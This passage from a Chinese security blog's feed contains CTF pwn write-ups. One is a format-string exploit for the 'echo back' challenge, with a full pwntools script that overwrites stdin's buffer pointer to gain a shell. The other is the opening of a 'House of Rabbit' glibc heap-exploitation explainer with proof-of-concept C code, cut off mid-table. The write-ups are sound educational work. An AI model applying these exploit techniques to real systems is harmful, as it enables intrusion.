2f 20 00  00 00 00 00  │#(··│2V··│0/ ·│····│</span></span><br><span class="line"><span class="string">    00000040  00 0b 00 00  00 00 00 00  0a                        │····│····│·│</span></span><br><span class="line"><span class="string">    00000049</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">: </span></span><br><span class="line"><span class="string">[DEBUG] Received 0x40 bytes:</span></span><br><span class="line"><span class="string">    '/home/ctf/run.sh: line 2:    84 Segmentation fault      ./house\n'</span></span><br><span class="line"><span class="string">/home/ctf/run.sh: line 2:    84 Segmentation fault      ./house</span></span><br><span class="line"><span class="string">[*] Got EOF while reading in interactive</span></span><br><span class="line"><span class="string">$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="echo-back"><a href="#echo-back" class="headerlink" title="echo back"></a>echo back</h1><p>此题当时没有做出来就和本科室友出去玩了… 后来回来复现了一下</p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>总体来说题目逻辑简单，漏洞也比较明显——格式化字符串，但是格式化字符串的长度是有限制的：</p><p><img src="/img/ciscn/3-1.png" alt="漏洞"></p><p>首先利用格式化字符串可以泄露PIE、栈、libc地址。存在一个setname函数，可以由用户输入一个长度为7的值，由此步骤和格式化字符串漏洞，可以达到一个向任意地址写一个四字节或两字节或单字节的\x00。</p><p><img src="/img/ciscn/3-2.png" alt="漏洞"></p><p>向任意地址写单字节的\x00还是比较敏感的，在去年的WHCTF 2017 中出现过一道向_IO_buf_base末位写\x00的利用方法，但是给定的libc是libc-2.24.so，此题虽然给的是libc-2.23.so，同样利用这个方法。</p><h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该种利用方法利用的是文件IO中的几个指针在scanf中的应用。之前针对IO的利用也写过一些，比如House of Orange，那种利用方法比较复杂，是与堆结合，之前写过一篇丢到了看雪上：<a href="https://bbs.pediy.com/thread-223334.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223334.htm</a> 这个攻击方法没有那么复杂，但是需要读scanf的源码。</p><p>首先scanf调用了 _IO_vfscanf ，并且提供增加了操作的文件指针stdin，这个指针很熟悉，是0号文件。其结构体是：</p><p><img src="/img/ciscn/3-4.png" alt="scanf"></p><p><img src="/img/ciscn/3-3.png" alt="IO指针"></p><p>其中红圈内的指针是本次漏洞利用主角</p><p>继续追踪_IO_vfscanf 函数，其具体实现是内联函数_IO_vfscanf_internal，其内部实现了scanf对于格式化的操作，其中比较重要的是inchar()，这个函数是读入用户输入数据的函数。此函数最终调用了_IO_new_file_underflow进行输入，这个最底层的操作。</p><p>查看函数逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">      _IO_flush_all_linebuffered ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (_IO_stdout, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (_IO_stdout);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure><p>当_IO_read_ptr &lt; _IO_read_end时，函数直接返回_IO_read_ptr。反之，则会进行一系列赋值操作，最终调用read的系统调用向_IO_buf_base中读入数据。可以想到，当可以控制_IO_buf_base的值就可以达到任意地址写的目的了。</p><p>题目中可以利用是因为当覆盖为00时，指针恰好指向了stdin内部地址，并且可以再次覆写_IO_buf_base进一步造成内存任意写，而在scanf后面跟了一个getchar()函数，每次调用这个函数是会导致_IO_read_ptr++。</p><p><img src="/img/ciscn/3-8.png" alt="echo函数"></p><p>由于在覆写_IO_base_buf时，会造成_IO_read_end+=输入的size，不断利用getchar可以使得_IO_read_ptr逐渐增大到_IO_read_end，最终再次调用read系统调用，达到内存任意写的目的。第二次覆写_IO_buf_base的内容为函数返回地址，写入ROP即可拿到shell</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./echo_back'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./echo_back'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'117.78.43.123'</span>, <span class="number">32619</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_name</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">(content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">echo(<span class="string">'%12$p\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'anonymous say:'</span>)</span><br><span class="line">stack_addr = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack :'</span>,hex(stack_addr)</span><br><span class="line">echo(<span class="string">'%13$p\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'anonymous say:'</span>)</span><br><span class="line">pie = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0xd08</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] pie :'</span>,hex(pie)</span><br><span class="line">echo(<span class="string">'%19$p\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'anonymous say:'</span>)</span><br><span class="line">libc.address = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-240</span>-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">set_name(p64(libc.address + <span class="number">0x3c4918</span>)[:<span class="number">-1</span>])</span><br><span class="line">echo(<span class="string">'%16$hhn'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">padding = p64(libc.address+<span class="number">0x3c4963</span>)*<span class="number">3</span> + p64(stack_addr<span class="number">-0x28</span>)+p64(stack_addr+<span class="number">0x10</span>)</span><br><span class="line">p.send(padding)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(padding)<span class="number">-1</span>):</span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">rop = p64(pie+<span class="number">0x0000000000000d93</span>)+p64(next(libc.search(<span class="string">'/bin/sh'</span>)))+p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x0000000000000d8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d8e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d90 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d92 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d8f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000940 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d93 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d91 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000861 : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;​    拖了好久才来整理全国大学生信息安全竞赛的题解，最近都在忙着DEF CON CHINA的RHG比赛的开发，虽然最后貌似只混了一件T恤… 这次比赛本来不想打的，三、四月份的比赛略多，最后趁着五一的假期，被Misty大佬召唤过来打了一天，队伍名称是Xopowo（俄语好的
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>House Of Rabbit 原理</title>
    <link href="http://p4nda.top/2018/04/18/house-of-rabbit/"/>
    <id>http://p4nda.top/2018/04/18/house-of-rabbit/</id>
    <published>2018-04-18T12:49:22.000Z</published>
    <updated>2018-04-18T15:40:49.645Z</updated>
    
    <content type="html"><![CDATA[<p>House Of Rabbit是一个比较新的堆利用姿势，在满足条件的情况下，可以绕过堆块的地址随机化保护（ASLR）达到<strong>任意</strong>地址分配的目的。</p><h1 id="所需条件"><a href="#所需条件" class="headerlink" title="所需条件"></a>所需条件</h1><ol><li>可以分配任意大小的堆块并且释放，主要包括三类fastbin大小的堆块、smallbin大小的堆块、较大的堆块（用于分配到任意地址处）</li><li>存在一块已知地址的内存空间，并可以任意写至少<strong>0x20</strong>长度的字节</li><li>存在fastbin dup、UAF等漏洞，用于劫持fastbin的fd指针。</li></ol><p>当存在上述三个条件时，即可使用House Of Rabbit攻击方法，Rabbit的含义大概是可以JUMP到任意地址（日本人的冷幽默？？）</p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h2><p>在<a href="https://github.com/shift-crops/House_of_Rabbit/blob/master/house_of_rabbit.c" target="_blank" rel="noopener">此处</a>有可以使用的样例文件，来自 <a href="https://github.com/shift-crops" target="_blank" rel="noopener">shift-crops</a> ，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   PoC of House of Rabbit</span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 16.04 (64bit).</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   Yutaro Shimizu</span></span><br><span class="line"><span class="comment">   @shift_crops</span></span><br><span class="line"><span class="comment">   2017/09/14</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> target[<span class="number">0x10</span>] = <span class="string">"Hello, World!"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gbuf[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p, *fast, *small, *fake;</span><br><span class="line"><span class="keyword">char</span> *victim;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This is PoC of House of Rabbit\n"</span></span><br><span class="line"><span class="string">"This technique bypassing Heap ASLR without leaking address, "</span></span><br><span class="line"><span class="string">"and make it possible to overwrite a variable located at an arbitary address.\n"</span></span><br><span class="line"><span class="string">"Jump like a rabbit and get an accurate address by malloc! :)\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. Make 'av-&gt;system_mem &gt; 0xa00000'</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1. Make 'av-&gt;system_mem &gt; 0xa00000'\n"</span>);</span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte by mmap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte in heap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. Free fast chunk and link to fastbins</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2. Free fast chunk and link to fastbins\n"</span>);</span><br><span class="line">fast = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">// any size in fastbins is ok </span></span><br><span class="line">small = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate fast chunk and small chunk.\n"</span></span><br><span class="line"><span class="string">"  fast = %p\n"</span></span><br><span class="line"><span class="string">"  small = %p\n"</span>, fast, small);</span><br><span class="line"><span class="built_in">free</span>(fast);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Free fast chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. Make fake_chunk on .bss</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3. Make fake_chunk on .bss\n"</span>);</span><br><span class="line">gbuf[<span class="number">1</span>] = <span class="number">0x11</span>;</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fake_chunk1 (size : 0x%lx) is at %p\n"</span></span><br><span class="line"><span class="string">"  fake_chunk2 (size : 0x%lx) is at %p\n\n"</span></span><br><span class="line">, gbuf[<span class="number">3</span>], &amp;gbuf[<span class="number">2</span>], gbuf[<span class="number">1</span>], &amp;gbuf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="comment">// use after free or fastbins dup etc...</span></span><br><span class="line">fake = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"VULNERABILITY (e.g. UAF)\n"</span></span><br><span class="line"><span class="string">"  *fast = %p\n"</span></span><br><span class="line">, fake);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>**)fast = fake;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fastbins list : [%p, %p, %p]\n\n"</span>, fast<span class="number">-0x10</span>, fake, *(<span class="keyword">void</span> **)(fake+<span class="number">0x10</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. call malloc_consolidate</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"4. call malloc_consolidate\n"</span></span><br><span class="line"><span class="string">"  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n"</span></span><br><span class="line">, small, fake);</span><br><span class="line"><span class="built_in">free</span>(small);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. Link unsorted bins to appropriate list</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"5. Link unsorted bins to appropriate list\n"</span></span><br><span class="line"><span class="string">"  Rewrite fake_chunk1's size to 0xa0001 to bypass 'size &lt; av-&gt;system_mem' check.\n"</span>);</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xa00001</span>;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate huge chunk.\n"</span></span><br><span class="line"><span class="string">"  Now, fake_chunk1 link to largebin[126](max).\n"</span></span><br><span class="line"><span class="string">"  Then, write fake_chunk1's size back to 0xfffffffffffffff1.\n\n"</span>);</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. Overwrite targer variable</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"6. Overwrite targer variable on .data\n"</span></span><br><span class="line"><span class="string">"  target is at %p\n"</span></span><br><span class="line"><span class="string">"  Before : %s\n"</span></span><br><span class="line">, &amp;target, target);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>((<span class="keyword">void</span>*)&amp;target-(<span class="keyword">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>);</span><br><span class="line">victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0x10 byte at %p, and overwrite.\n"</span>, victim);</span><br><span class="line"><span class="built_in">strcpy</span>(victim, <span class="string">"Hacked!!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  After  : %s\n"</span>, target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面对这个利用方法进行分步解析</p><h2 id="步骤1-增大malloc函数中-mmap分配阈值"><a href="#步骤1-增大malloc函数中-mmap分配阈值" class="headerlink" title="步骤1 增大malloc函数中 mmap分配阈值"></a>步骤1 增大malloc函数中 mmap分配阈值</h2><p>当通过malloc函数分配内存时，当超过某特定阈值时，堆块会由mmap来分配，但同时会改变该阈值。具体改变和分配代码如下：</p><p>分配代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) </span><br><span class="line">   &amp;&amp;(mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">   &#123;</span><br><span class="line">      ……</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>阈值改变：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 